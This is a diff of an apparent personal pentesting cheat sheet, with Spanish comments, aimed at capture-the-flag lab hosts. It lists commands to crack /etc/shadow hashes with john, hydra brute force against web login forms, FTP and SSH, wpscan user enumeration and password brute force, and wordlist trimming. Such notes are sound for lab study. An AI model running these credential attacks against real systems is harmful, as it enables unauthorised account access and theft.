@@ -36,15 +36,15 @@ unshadow /etc/passwd /etc/shadow > hash
 john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt hash
  
 # hydra login brute force
-hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.80.107 http-post-form "/admin/:Username=^USER^&Password=^PASS^:Incorrect Credentials" -f -V
-hydra -L wordlist.txt -P wordlist.txt 10.10.90.206 -s 8080 http-form-port "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&form=%2F&Submit=Sign+in:loginError"
 hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV 10.10.158.58 ftp
 hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV 10.10.67.168 ssh
-hydra -L SQL.txt -p pass 10.10.192.4 http-post-form “/index.php:username=^USER^&password=^PASS^&x=30&y=:Incorrect Login” -f #p=password random,f=para el ataque cuando encuentra credenciales
+hydra -l admin -P /usr/share/wordlists/rockyou.txt internal.thm http-post-form "/blog/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:The password you entered" -f -V
+hydra -l admin -P rock9L.txt localhost -s 8081 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password" -f -V
 
 # wpscan 
 wpscan --url URL -e ap --plugins-detection aggresive -o OUTFILE
 wpscan --url URL --enumerate u
+wpscan --url IP/blog --usernames admin --passwords rockyou.txt --max-threads 50
 
 # diccionarios
 awk 'length($0) == 10' rockyou.txt > rock-10L.txt # achicar el diccionario a 10 caracteres de largo
